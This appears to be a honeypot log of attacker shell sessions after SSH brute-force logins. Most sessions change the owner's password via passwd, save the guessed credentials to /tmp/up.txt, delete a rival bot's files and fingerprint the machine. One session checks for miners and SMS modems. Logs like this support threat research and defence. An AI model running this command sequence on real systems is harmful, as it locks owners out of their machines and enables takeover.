+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin123456" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 4ee1cdcf67a3
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "matrix\nxdjCJ4ztk5gI\nxdjCJ4ztk5gI"|passwd|bash
+echo "matrix\nxdjCJ4ztk5gI\nxdjCJ4ztk5gI\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin matrix" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 64041564d4ba
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "sysadmin\n3efaeA90UccN\n3efaeA90UccN"|passwd|bash
+echo "sysadmin\n3efaeA90UccN\n3efaeA90UccN\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin sysadmin" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 8383fcb5d0a2
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "articon\nia5fJGDu2ZxB\nia5fJGDu2ZxB"|passwd|bash
+echo "articon\nia5fJGDu2ZxB\nia5fJGDu2ZxB\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin articon" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: b038268745ab
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "!QAZxsw2\nKdGdbLCmmhDX\nKdGdbLCmmhDX"|passwd|bash
+echo "!QAZxsw2\nKdGdbLCmmhDX\nKdGdbLCmmhDX\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin !QAZxsw2" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 387075b0317b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1q2w3e4r5t6y\nUVJ5rSmB832r\nUVJ5rSmB832r"|passwd|bash
+echo "1q2w3e4r5t6y\nUVJ5rSmB832r\nUVJ5rSmB832r\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1q2w3e4r5t6y" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 1d400973f25e
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwertyuiop\nhC2Y8yhwLwJK\nhC2Y8yhwLwJK"|passwd|bash
+echo "qwertyuiop\nhC2Y8yhwLwJK\nhC2Y8yhwLwJK\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwertyuiop" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: abe9e1d873ec
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "321\npqpP0HAUhET1\npqpP0HAUhET1"|passwd|bash
+echo "321\npqpP0HAUhET1\npqpP0HAUhET1\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 321" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: cb5d0c496681
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1q2w3e4r5t6y\nT2JUhEM1AKSm\nT2JUhEM1AKSm"|passwd|bash
+echo "1q2w3e4r5t6y\nT2JUhEM1AKSm\nT2JUhEM1AKSm\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1q2w3e4r5t6y" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: eee311235f65
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "a1b2c3d4\nqxWMTJIkR4oo\nqxWMTJIkR4oo"|passwd|bash
+echo "a1b2c3d4\nqxWMTJIkR4oo\nqxWMTJIkR4oo\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin a1b2c3d4" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 5e0ba9da0f54
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "adminadmin\nMjUaGTvQidct\nMjUaGTvQidct"|passwd|bash
+echo "adminadmin\nMjUaGTvQidct\nMjUaGTvQidct\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin adminadmin" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 4dd0e8b97014
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123admin123\nuL8kPHqvCCUw\nuL8kPHqvCCUw"|passwd|bash
+echo "123admin123\nuL8kPHqvCCUw\nuL8kPHqvCCUw\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123admin123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ca668bdc003b
+/ip cloud print
+ifconfig
+uname -a
+cat /proc/cpuinfo
+ps | grep '[Mm]iner'
+ps -ef | grep '[Mm]iner'
+ls -la /dev/ttyGSM* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+echo Hi | cat -n
+
+Session ID: 1c2f031038cc
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwe@123\nfwYaxMsL7A1G\nfwYaxMsL7A1G"|passwd|bash
+echo "qwe@123\nfwYaxMsL7A1G\nfwYaxMsL7A1G\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwe@123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ba062a9c3efc
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "guest\nAyv7nIL9krhu\nAyv7nIL9krhu"|passwd|bash
+echo "guest\nAyv7nIL9krhu\nAyv7nIL9krhu\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin guest" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 5e2dd3c1153b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qmfltmqjs!@#$\nOmsK2afVsQbr\nOmsK2afVsQbr"|passwd|bash
+echo "qmfltmqjs!@#$\nOmsK2afVsQbr\nOmsK2afVsQbr\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qmfltmqjs!@#$" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d72ce60a496f
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@55w0rd\nasEJo7GXCUU0\nasEJo7GXCUU0"|passwd|bash
+echo "p@55w0rd\nasEJo7GXCUU0\nasEJo7GXCUU0\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@55w0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 47b0998ce258
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123123\nvCUsTgTjrpna\nvCUsTgTjrpna"|passwd|bash
+echo "123123\nvCUsTgTjrpna\nvCUsTgTjrpna\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 89a7f0b26d90
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1q2w3e\nw9thZtPEH9kz\nw9thZtPEH9kz"|passwd|bash
+echo "1q2w3e\nw9thZtPEH9kz\nw9thZtPEH9kz\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1q2w3e" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 8af3776c32fb
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "12345678\nvgKfXAx7KWTh\nvgKfXAx7KWTh"|passwd|bash
+echo "12345678\nvgKfXAx7KWTh\nvgKfXAx7KWTh\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 12345678" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 3ad637cdb357
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123321\nx1kusPOI2niv\nx1kusPOI2niv"|passwd|bash
+echo "123321\nx1kusPOI2niv\nx1kusPOI2niv\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123321" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 144c8008bd76
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "abcd1234\n7AuOC9NsNcaL\n7AuOC9NsNcaL"|passwd|bash
+echo "abcd1234\n7AuOC9NsNcaL\n7AuOC9NsNcaL\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin abcd1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: c80ab16934cc
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "4dm1n\n60hRlOyC4PUl\n60hRlOyC4PUl"|passwd|bash
+echo "4dm1n\n60hRlOyC4PUl\n60hRlOyC4PUl\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 4dm1n" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 4e7f783327e8
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "hipchat\nCxaVerhImnRf\nCxaVerhImnRf"|passwd|bash
+echo "hipchat\nCxaVerhImnRf\nCxaVerhImnRf\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin hipchat" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: e56d3b7ac40f
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwerty123\nwIEoiwOPeqFm\nwIEoiwOPeqFm"|passwd|bash
+echo "qwerty123\nwIEoiwOPeqFm\nwIEoiwOPeqFm\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwerty123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ff0570aedecf
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1q2w3e\nNRunWFnRHoFG\nNRunWFnRHoFG"|passwd|bash
+echo "1q2w3e\nNRunWFnRHoFG\nNRunWFnRHoFG\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1q2w3e" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d85e8813f37c
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "7ujMko0admin\nWcNc5YvPVemn\nWcNc5YvPVemn"|passwd|bash
+echo "7ujMko0admin\nWcNc5YvPVemn\nWcNc5YvPVemn\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 7ujMko0admin" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 01c20ebd9bcf
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwerty123\nwIEoiwOPeqFm\nwIEoiwOPeqFm"|passwd|bash
+echo "qwerty123\nwIEoiwOPeqFm\nwIEoiwOPeqFm\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwerty123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 6a2fa9d8b693
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin@123\nGXv3pca7ebAE\nGXv3pca7ebAE"|passwd|bash
+echo "admin@123\nGXv3pca7ebAE\nGXv3pca7ebAE\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin@123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 9d51412e2b8b
+LC_ALL=C top -bn1
+
+Session ID: 41b9d8488b00
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwerty123\nOAuyQRIDp2r1\nOAuyQRIDp2r1"|passwd|bash
+echo "qwerty123\nOAuyQRIDp2r1\nOAuyQRIDp2r1\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwerty123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 611609e84711
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "(none)\npLw3pMsuv4WJ\npLw3pMsuv4WJ"|passwd|bash
+echo "(none)\npLw3pMsuv4WJ\npLw3pMsuv4WJ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin (none)" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 382e3865183a
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "000000\nISA85BarOMs9\nISA85BarOMs9"|passwd|bash
+echo "000000\nISA85BarOMs9\nISA85BarOMs9\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 000000" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: dfa68176f52e
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin2019\nnHhREb6DjkKI\nnHhREb6DjkKI"|passwd|bash
+echo "admin2019\nnHhREb6DjkKI\nnHhREb6DjkKI\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin2019" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 2f47d1428e33
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1111\n6R0XUJWxRKP5\n6R0XUJWxRKP5"|passwd|bash
+echo "1111\n6R0XUJWxRKP5\n6R0XUJWxRKP5\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1111" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 02340c38dbe9
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin321\nJWuHaOAN8Ddn\nJWuHaOAN8Ddn"|passwd|bash
+echo "admin321\nJWuHaOAN8Ddn\nJWuHaOAN8Ddn\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin321" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: b14122c90580
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "administrator\niH7CwtrETy5d\niH7CwtrETy5d"|passwd|bash
+echo "administrator\niH7CwtrETy5d\niH7CwtrETy5d\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin administrator" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 0452b3826722
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "12345\naDgEAnpdq6Zb\naDgEAnpdq6Zb"|passwd|bash
+echo "12345\naDgEAnpdq6Zb\naDgEAnpdq6Zb\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 12345" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 9d63f79ff020
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "Password1!\nwK80h8v2tncQ\nwK80h8v2tncQ"|passwd|bash
+echo "Password1!\nwK80h8v2tncQ\nwK80h8v2tncQ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin Password1!" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: a465562d6b74
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1q2w3e4r\nUG97ZgMP0ffW\nUG97ZgMP0ffW"|passwd|bash
+echo "1q2w3e4r\nUG97ZgMP0ffW\nUG97ZgMP0ffW\n"|passwd
